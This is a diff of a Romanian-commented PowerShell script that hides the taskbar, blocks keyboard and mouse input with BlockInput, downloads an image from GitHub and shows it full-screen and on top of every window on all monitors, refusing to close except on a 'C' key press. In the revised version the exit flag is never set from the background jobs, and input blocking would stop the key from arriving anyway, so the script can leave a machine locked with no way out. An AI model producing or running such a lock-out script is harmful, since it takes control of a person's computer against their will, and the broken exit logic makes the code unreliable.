@@ -1,21 +1,13 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Cod pentru blocarea inputului
+# Cod pt blocare input
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class InputBlocker {
+public class NativeMethods {
     [DllImport("user32.dll")]
     public static extern bool BlockInput(bool fBlockIt);
-}
-"@
-
-# Cod pentru taskbar
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class TaskbarHider {
     [DllImport("user32.dll")]
     public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
     [DllImport("user32.dll")]
@@ -23,25 +15,25 @@ public class TaskbarHider {
 }
 "@
 
-# Ascunde Taskbar
-$taskbar = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
-[TaskbarHider]::ShowWindow($taskbar, 0)
+# Ascunde taskbar
+$taskbar = [NativeMethods]::FindWindow("Shell_TrayWnd", "")
+[NativeMethods]::ShowWindow($taskbar, 0)
 
-# Descarcă imaginea dacă nu există
+# Blochează input
+[NativeMethods]::BlockInput($true)
+
+# Descarcă poza
 $tempImage = "$env:TEMP\poza_laptop.jpg"
 if (-not (Test-Path $tempImage)) {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage
 }
 
-# Blochează inputul
-[InputBlocker]::BlockInput($true)
-
-# Variabilă globală de control
-$script:inchide = $false
+# Variabilă globală pt ieșire
+$script:inchidereCeruta = $false
 $forme = @()
 
-# Funcție care deschide o fereastră pe un ecran
-function DeschideFereastraPeMonitor {
+# Funcție pt crearea unei ferestre pe un ecran
+function AfiseazaPozaPeEcran {
     param($bounds)
 
     $form = New-Object Windows.Forms.Form
@@ -49,9 +41,9 @@ function DeschideFereastraPeMonitor {
     $form.Bounds = $bounds
     $form.FormBorderStyle = 'None'
     $form.TopMost = $true
+    $form.ShowInTaskbar = $false
     $form.BackColor = 'Black'
     $form.KeyPreview = $true
-    $form.ShowInTaskbar = $false
     $form.Cursor = [System.Windows.Forms.Cursors]::None
 
     $pictureBox = New-Object Windows.Forms.PictureBox
@@ -62,12 +54,12 @@ function DeschideFereastraPeMonitor {
 
     $form.Add_KeyDown({
         if ($_.KeyCode -eq 'C') {
-            $script:inchide = $true
+            $script:inchidereCeruta = $true
         }
     })
 
     $form.Add_FormClosing({
-        if (-not $script:inchide) {
+        if (-not $script:inchidereCeruta) {
             $_.Cancel = $true
         }
     })
@@ -76,29 +68,51 @@ function DeschideFereastraPeMonitor {
     [System.Windows.Forms.Application]::Run($form)
 }
 
-# Creăm câte un thread pentru fiecare ecran
+# Rulează câte o fereastră pe fiecare monitor, dar sincron (nu cu thread)
 foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
-    $bounds = $screen.Bounds
-    $scriptBlock = {
-        param($b)
-        DeschideFereastraPeMonitor -bounds $b
-    }.GetNewClosure()
+    $job = Start-Job -ScriptBlock {
+        param($bounds, $imagePath)
 
-    $thread = New-Object System.Threading.Thread([Threading.ThreadStart]{
-        $scriptBlock.Invoke($bounds)
-    })
-    $thread.SetApartmentState("STA")
-    $thread.Start()
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+
+        $form = New-Object Windows.Forms.Form
+        $form.StartPosition = 'Manual'
+        $form.Bounds = $bounds
+        $form.FormBorderStyle = 'None'
+        $form.TopMost = $true
+        $form.ShowInTaskbar = $false
+        $form.BackColor = 'Black'
+        $form.KeyPreview = $true
+        $form.Cursor = [System.Windows.Forms.Cursors]::None
+
+        $pictureBox = New-Object Windows.Forms.PictureBox
+        $pictureBox.ImageLocation = $imagePath
+        $pictureBox.SizeMode = 'Zoom'
+        $pictureBox.Dock = 'Fill'
+        $form.Controls.Add($pictureBox)
+
+        $form.Add_KeyDown({
+            if ($_.KeyCode -eq 'C') {
+                $form.Close()
+            }
+        })
+
+        [System.Windows.Forms.Application]::Run($form)
+
+    } -ArgumentList $screen.Bounds, $tempImage
+
+    Start-Sleep -Milliseconds 500
 }
 
-# Așteaptă până când tasta C este apăsată
-while (-not $script:inchide) {
-    Start-Sleep -Milliseconds 200
-}
+# Așteaptă apăsarea tastei C global
+do {
+    Start-Sleep -Milliseconds 300
+} until ($script:inchidereCeruta)
 
 # Închide totul
 foreach ($f in $forme) {
     try { $f.Invoke([Action]{ $f.Close() }) } catch {}
 }
-[TaskbarHider]::ShowWindow($taskbar, 1)
-[InputBlocker]::BlockInput($false)
+[NativeMethods]::BlockInput($false)
+[NativeMethods]::ShowWindow($taskbar, 1)
